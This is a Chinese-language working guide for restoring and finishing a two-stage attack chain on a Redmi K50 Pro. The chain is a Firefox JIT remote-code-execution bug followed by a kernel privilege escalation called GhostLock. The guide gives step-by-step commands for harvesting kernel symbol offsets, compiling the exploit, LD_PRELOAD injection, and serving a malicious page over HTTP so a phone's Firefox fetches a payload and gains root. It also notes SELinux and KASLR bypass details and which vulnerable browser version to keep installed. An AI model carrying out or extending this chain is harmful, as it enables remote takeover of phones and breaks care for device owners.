# 项目恢复指南 — Redmi K50 Pro (matisse) GhostLock 远程利用

> 解压 `matisse_backup_essentials.zip` 后，按此文档快速恢复工作环境。

---

## 一、项目概述

| 项目 | 详情 |
|------|------|
| 目标设备 | Redmi K50 Pro (matisse) |
| 系统版本 | OS2.0.6.0.ULKCNXM (Android 14) |
| 内核版本 | 5.10.209-android12-9 (ARM64) |
| 漏洞1 | CVE-2026-10702 (Firefox JIT 类型混淆 → 浏览器 RCE) |
| 漏洞2 | CVE-2026-43499 (GhostLock → 内核提权) |
| 攻击链 | IonStack: 浏览器 → 内核 → Root |
| 当前状态 | Kernel 已提取、符号已分析、exploit 源码已下载，待配置 matisse 偏移量 |

---

## 二、备份文件清单

```
matisse_backup_essentials.zip (108 MB)
├── *.py                        # 39 个 Python 工具脚本
├── 操作指南.md                  # 本地利用操作指南
├── 项目恢复指南.md              # 本文件
├── extracted/
│   ├── kernel.Image            # 解压后内核 (47 MB) — 最重要！
│   ├── kernel.gz               # 压缩内核 (19.6 MB)
│   ├── kernel.raw.gz           # 原始内核 (19.6 MB)
│   ├── boot_final.img          # 完整 boot 镜像 (64 MB)
│   ├── vendor_boot_full.img    # vendor_boot 镜像 (54 MB)
│   └── system.img              # system 镜像 (32 MB)
├── IonStack/                   # exploit 源码 (CVE-2026-43499 + CVE-2026-10702)
├── CyberMeowfia/               # 仓库元数据
├── payload_properties.txt      # OTA 校验信息
├── apex_info.pb
└── care_map.pb
```

---

## 三、恢复环境 — 你需要安装的工具

### 3.1 Python 3
```cmd
python --version  # 确认已安装
```

### 3.2 ADB (Platform Tools)
- 下载: https://developer.android.com/tools/releases/platform-tools
- 解压到 `C:\adb`，加入 PATH
```cmd
adb version
adb devices   # 连接手机后验证
```

### 3.3 Android NDK (交叉编译 exploit)
- 下载: https://developer.android.com/ndk/downloads
- 推荐 r29，解压到 `C:\android-ndk`
```cmd
set NDK_ROOT=C:\android-ndk
```

### 3.4 Git (可选，用于拉取最新 exploit)
```cmd
git --version
```

---

## 四、快速恢复步骤

### 第 1 步：还原 payload.bin（如果需要）

如果备份中不含 payload.bin（约 4GB），从 OTA 包重新解压：
```cmd
# 从 zip 中提取 payload.bin 到工作目录
```

### 第 2 步：重新提取 boot/kernel（如果 kernel.Image 丢失）

```cmd
cd matisse-ota_full-OS2.0.6.0.ULKCNXM-user-14.0-4853637358
python extract_final_correct.py
```
产出: `extracted/boot_final.img` + `extracted/kernel.Image`

### 第 3 步：验证内核版本

```cmd
python extract_exploit_info.py
```
应输出: `Kernel version: Linux version 5.10.209`

### 第 4 步：确认 exploit 源码结构

```
IonStack/
├── CVE-2026-10702/           # Firefox 浏览器漏洞
│   ├── exploit.html           # 主 exploit 页面 (33KB)
│   ├── index.html             # 恶意网页入口
│   └── ansi.js                # 辅助脚本
└── CVE-2026-43499/           # GhostLock 内核漏洞
    └── exploit/
        ├── Makefile
        ├── src/
        │   ├── common.h       # 核心头文件 (定义所有偏移量宏)
        │   ├── offset.h       # 引用 target.h
        │   ├── main.c         # exploit 入口
        │   ├── root.c         # 提权逻辑
        │   ├── util.c         # 基础设施 (堆喷、管道等)
        │   ├── slide.c        # KASLR 绕过
        │   ├── fops.c         # 文件操作表劫持
        │   ├── pipe.c         # 管道物理读写
        │   ├── preload.c      # LD_PRELOAD 注入
        │   ├── su_daemon.c    # su 守护进程
        │   ├── su_blob.S      # su 二进制嵌入
        │   ├── wallpaper_blob.S
        │   ├── kernelsnitch/  # 内核堆风水 (futex)
        │   └── targets/       # 设备配置目录
        │       └── blazer-CP2A.260605.012/target.h  # 参考配置
        └── assets/
            └── wallpaper.webp
```

### 第 5 步：创建 matisse 的 target.h

这是**最关键的一步**。需要从 kernel.Image 或运行中设备提取以下偏移量：

**必须从设备获取的（通过 ADB）：**
```cmd
adb shell "cat /proc/kallsyms" > kallsyms.txt
```
需要找:
- `_text` → KIMAGE_TEXT_BASE
- `init_task` → INIT_TASK_OFF
- `selinux_enforcing` → SELINUX_ENFORCING_OFF
- `anon_pipe_buf_ops` → ANON_PIPE_BUF_OPS_OFF

**可从 kernel.Image 静态获取的（通过 Python 脚本）：**
```cmd
python find_kernel_symbols.py
python extract_kallsyms.py
python extract_exploit_info.py
```

**剩余偏移量需参考 blazer 的 target.h 结构逐项填写。**

### 第 6 步：编译 exploit

```cmd
cd IonStack\CVE-2026-43499\exploit

# 需要先创建 matisse 的 target.h
# 然后编译:
make PROJECT=matisse-OS2.0.6.0.ULKCNXM API=34
```

### 第 7 步：运行 exploit

**本地测试：**
```cmd
adb push build/matisse-OS2.0.6.0.ULKCNXM/bin/preload.so /data/local/tmp/
adb shell "LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sh"
```

**远程利用（Firefox 链）：**
```cmd
# 1. 启动 HTTP 服务器
cd IonStack\CVE-2026-10702
python -m http.server 8080

# 2. 手机上用 Firefox 访问
# http://<电脑IP>:8080/index.html

# 3. exploit 自动执行链：
#    Firefox JIT 漏洞 → 浏览器 RCE → 下载 preload.so → GhostLock → Root
```

---

## 五、当前进度与待办

| 状态 | 任务 |
|------|------|
| ✅ 完成 | OTA 解包、payload.bin 解析 |
| ✅ 完成 | boot.img 提取 (boot_final.img) |
| ✅ 完成 | kernel 解压 (kernel.Image, 47MB) |
| ✅ 完成 | 内核版本确认 (5.10.209, 漏洞范围内) |
| ✅ 完成 | 内核符号字符串定位 (commit_creds, prctl, rt_mutex 等) |
| ✅ 完成 | core_pattern、modprobe_path 定位 |
| ✅ 完成 | IonStack 源码下载 |
| 🔄 进行中 | 下载 exploit 完整源码到本地 |
| ⬜ 待办 | **从设备获取 /proc/kallsyms（关键！）** |
| ⬜ 待办 | 创建 matisse 的 target.h |
| ⬜ 待办 | 提取 ashmem fops 偏移量（注意：MTK Rust ashmem！） |
| ⬜ 待办 | 确定 KIMAGE_TEXT_BASE、直接映射范围 |
| ⬜ 待办 | 编译 exploit |
| ⬜ 待办 | 搭建远程 HTTP 服务器 |
| ⬜ 待办 | 测试 Firefox 远程利用链 |

---

## 六、关键注意事项

1. **MTK 设备特殊性**：Redmi K50 Pro 使用联发科芯片，ashmem 驱动可能是 Rust 实现，只有 `compat_ioctl` 没有 `unlocked_ioctl`。exploit 中 ashmem fops 偏移需要特别处理。

2. **KASLR**：exploit 内置了 prefetch timing 绕过 KASLR（slide.c），但需要正确的 KIMAGE_TEXT_BASE 和直接映射范围。

3. **Firefox 版本**：CVE-2026-10702 在 Firefox 151.0.3 中修复。确保手机上安装的 Firefox 版本 ≤ 151.0.2。

4. **SELinux**：exploit 包含 SELinux 绕过（root.c 中的 `patch_cred_sid`），但需要正确的 `selinux_enforcing` 和 `security_hook_heads` 偏移。

5. **恢复后第一件事**：连接手机，运行 `adb shell "cat /proc/kallsyms" > kallsyms.txt`，这是最关键的数据！

---

## 七、恢复后立即执行的命令

```cmd
# 1. 确认 Python 环境
python --version

# 2. 连接手机
adb devices

# 3. 导出内核符号表（最重要！）
adb shell "cat /proc/kallsyms" > kallsyms.txt

# 4. 确认内核版本
adb shell "uname -r"

# 5. 确认 Firefox 版本
adb shell "dumpsys package org.mozilla.firefox | grep versionName"

# 6. 验证 kernel Image 可用
python extract_exploit_info.py

# 7. 开始配置 target.h
```

---

> 📅 备份日期：2026-07-12
> 💾 备份文件：matisse_backup_essentials.zip (108 MB)